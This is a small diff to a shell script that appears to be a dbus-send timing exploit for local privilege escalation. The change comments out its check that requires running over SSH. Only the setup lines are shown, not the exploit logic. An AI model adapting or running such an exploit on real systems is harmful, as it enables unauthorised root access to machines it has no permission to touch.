@@ -30,10 +30,10 @@ else
 fi
 
 # Validate user is running in SSH instead of desktop terminal
-if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then
-    echo "[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts"
-    exit
-fi
+#if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then
+ #   echo "[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts"
+  #  exit
+#fi
 
 # Test the dbus-send timing to load into exploit
 echo "[*] Determining dbus-send timing"
